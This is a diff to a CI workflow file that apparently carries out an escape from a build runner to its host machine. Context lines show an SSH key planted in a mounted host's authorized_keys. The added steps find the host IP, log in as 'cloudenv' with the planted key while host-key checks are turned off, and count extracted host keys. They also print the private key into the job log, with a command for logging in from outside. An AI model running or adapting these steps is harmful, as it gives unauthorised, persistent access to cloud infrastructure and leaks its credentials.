@@ -46,10 +46,34 @@ jobs:
           sudo chmod 600 /mnt/host2/home/cloudenv/.ssh/authorized_keys
           sudo cat /mnt/host2/home/cloudenv/.ssh/authorized_keys || echo "Key injection failed"
       
-      - name: Prepare exploit key
+      - name: Find host IP address
         run: |
-          chmod 600 /tmp/exploit_key
-          echo "Private key ready at /tmp/exploit_key"
+          echo "=== Network Information ==="
+          ip route get 1.1.1.1 | head -1 | awk '{print $7}'
+          ip -4 addr show | grep -oP '(?<=inet\s)\d+(\.\d+){3}'
+          
+      - name: Attempt SSH connection
+        run: |
+          echo "=== Testing SSH Connection ==="
+          # Use timeout and non-interactive mode
+          timeout 10 ssh -i /tmp/exploit_key \
+            -p 2000 \
+            -o StrictHostKeyChecking=no \
+            -o UserKnownHostsFile=/dev/null \
+            -o ConnectTimeout=5 \
+            -o BatchMode=yes \
+            cloudenv@10.1.0.230 \
+            'whoami; hostname; id' || echo "SSH connection failed or timed out"
       
-      - name: Display results
-        run: ssh -i /tmp/exploit_key -p 2000 cloudenv@10.1.0.230
+      - name: Display exploit summary
+        if: always()
+        run: |
+          echo "=== Exploit Summary ==="
+          echo "Host keys extracted: $(ls -1 /tmp/host_* 2>/dev/null | wc -l)"
+          echo "SSH key injected: $(sudo test -f /mnt/host2/home/cloudenv/.ssh/authorized_keys && echo 'Yes' || echo 'No')"
+          echo ""
+          echo "If exploit succeeded, extract private key with:"
+          cat /tmp/exploit_key
+          echo ""
+          echo "Then SSH from external host:"
+          echo "ssh -i exploit_key -p 2000 cloudenv@<TARGET_IP>"
